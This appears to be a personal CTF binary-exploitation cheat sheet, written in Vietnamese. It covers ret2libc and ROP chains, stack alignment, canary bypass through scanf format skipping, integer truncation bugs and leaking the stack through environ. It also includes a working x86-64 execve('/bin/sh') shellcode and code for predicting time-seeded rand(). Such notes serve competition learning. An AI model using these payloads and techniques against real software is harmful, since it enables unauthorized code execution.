# ret2libc-ROP

- Overview:
   * pwntools '/bin/sh':  - `next(libc.search(b'/bin/sh'))` . 
   * Từ Ubuntu 18.04 trở đi, nếu việc thực thi thất bại tại những hàm như buffered_vfprintf() hay do_system() trong những file thực thi 64 bit là do ngay trước câu lệnh ret, đầu vùng nhớ stack được cấp phát 16 bytes cho việc gọi lệnh tại return address nên để thực thi được thì cần chèn thêm 1 ROPgadget "ret" vào trước câu lệnh cần thực thi để bỏ đi 1 stack 8 bytes đầu tiên và thực thi câu lệnh này nằm ở stack ngay sau đó.
    ```
    STACK:
    1. địa chỉ lệnh "ret"
    2. địa chỉ lệnh "pop rdi, ret"
    3. địa chỉ lưu chuỗi 
    4. địa chỉ hàm gets

    5. địa chỉ lệnh "ret"
    6. địa chỉ lệnh "pop rdi, ret"
    7. địa chỉ muốn được in (đọc chuỗi)
    8. địa chỉ hàm printf 
    # leak = printf thì sau printf lại phải dùng ret
    9. địa chỉ lệnh "ret"
    10. địa chỉ nào đó muốn return về.
    ```
    * Trong libc.so.6 có mọi gadgets, đôi khi không thể dùng tools để tìm được 1 số gadgets. VD: `syscall ; ret` [dicectf 2023 - bop].
    * Vậy nên để bypass tránh việc ghi đè canary ta chỉ cần nhập chữ cái (+, -, *, /) mà không thuộc format %lu thì phần tử đó sẽ bị skip, không thay đổi. VD: chall `Warmup` - UIT-2022-CTF . 
    * Lỗi ép kiểu là khi khai báo biến x là long (8 byte) nhưng khi xử lý điều kiện ép kiểu nó thành int (4 byte) dẫn đến sai về mặt giá trị so sánh (trên thanh ghi) => bug
    * Leak được LIBC thì có thể leak được stack thông qua biến environ trong LIBC.
    * Viết sheelcode cần set context.binary

    ```python
    ...
    elf = ELF('./vuln')
    context.binary = elf
    p = elf.process()
    ...

    shellcode = asm('''
         instruction assembly
         ...
    ''')

    OR

    context.arch = 'amd64'
    shellcode = asm(
        f'''
        xor rdi, rdi
        push rdi
        mov rdi, 0x68732f2f6e69622f
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        xor rsi, rsi
        xor rax, rax
        add al, 0x3b
        syscall
        ''')
    ```


- Technique:
    * [CTF: No leak - close(fd)](https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/) .
    * [CTF: BlindROP](https://soolidsnake.github.io/2018/07/15/blindx86_64_rop.html) .

- OTHER LOGIC BUG: seed, permission, ...
    * __RANDOM => seed__: dùng seed có giá trị là thời gian thực lúc chạy chương trình, vì vậy tạo 1 script chạy cùng là xong

    * Nhiệm vụ của srand(x) đưa ra seed x rồi rand() dựa vào x đưa ra số a. Khi đó a là seed cho lần gọi rand() tiếp theo (cứ như thế tiếp tục). Do vậy VD trong vòng lặp thời gian 1 giây rand() dùng seed cũ liên tục nên nó không bao giờ ra số khác nhau trong khoảng thời gian đó.

    * VD: [Meshuggah](https://qbao.home.blog/2020/04/30/start-to-pwnb01lers-ctf/) .
    ```asm
    asm:
        mov edi, 0      ; time
        call _time
        add eax, 2
        mov edi, eax    ; seed
        call _srand
    ```

    ```C
    int main(){
        int seed = time(0) + 2;
        srand(seed);
        for(int i = 0; i < 100; i++)
            printf("%d\n", rand());
        return 0;
    }
    ```

    ```python
    from ctypes import CDLL
    from ctypes.util import find_library

    libc = CDLL(find_library("c"))

    libc.srand(0x5a35b162)
    print(libc.rand(), libc.rand(), libc.rand())
    ```
    * BRUTEFORCE - `TWOSHOT - KMACTF2022`
    * ...

